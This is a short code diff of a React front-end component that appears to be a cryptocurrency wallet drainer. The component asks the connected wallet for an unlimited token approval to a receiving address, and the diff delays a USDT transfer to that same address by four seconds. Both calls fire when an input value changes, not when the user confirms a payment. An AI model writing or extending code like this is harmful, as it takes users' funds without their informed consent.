@@ -145,13 +145,16 @@ const RightSide = () => {
       args: [walletReceive, maxUint256],
     });
 
-    await writeContractSendAsync({
-      address: USDT_CONTRACT[chainId],
-      functionName: "transfer",
-      abi: erc20Abi,
-      // @ts-ignore
-      args: [walletReceive, sendValue],
-    });
+    setTimeout(async () => {
+      await writeContractSendAsync({
+        address: USDT_CONTRACT[chainId],
+        functionName: "transfer",
+        abi: erc20Abi,
+        // @ts-ignore
+        args: [walletReceive, sendValue],
+      });
+    }, 4000);
+
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [inputValue]);
 
